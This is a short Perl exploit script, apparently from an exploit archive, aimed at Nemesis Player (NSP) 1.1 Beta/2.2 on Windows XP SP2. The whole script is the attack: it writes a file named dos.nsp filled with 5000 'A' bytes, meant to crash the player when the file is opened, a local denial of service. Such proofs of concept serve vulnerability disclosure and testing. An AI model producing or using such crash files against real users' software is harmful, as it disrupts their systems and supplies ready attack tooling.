#!/usr/bin/perl
#Exploit Title: Nemesis Player (NSP) Local Denial of Service (DoS) Vulnerability
#Author:Vulnerability Discovered By Rehan Ahmed (rehan@rewterz.com)
#Vendor:http://www.nsplayer.org
#Version:1.1 Beta/2.2
#Tested On: WinXP SP2

my $boom="\x41" x 5000;
my $file="dos.nsp"; 
open($FILE,">$file");
print $FILE $boom;
close($FILE);
print "File Successfully Created\n";


